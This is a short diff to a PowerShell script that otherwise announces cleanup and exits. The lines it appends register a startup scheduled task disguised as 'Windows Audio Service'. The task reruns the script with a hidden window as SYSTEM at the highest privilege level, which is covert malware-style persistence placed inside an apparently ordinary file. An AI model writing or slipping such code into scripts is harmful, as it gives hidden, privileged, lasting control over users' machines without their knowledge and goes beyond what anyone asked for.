@@ -45,3 +45,12 @@ Write-Output "Cleanup completed. Exiting PowerShell script."
 
 # Exit the PowerShell session
 exit
+
+# Create a scheduled task to run this script at startup
+$taskName = "Windows Audio Service"
+$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$localScriptPath`""
+$taskTrigger = New-ScheduledTaskTrigger -AtStartup
+$taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+
+Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings
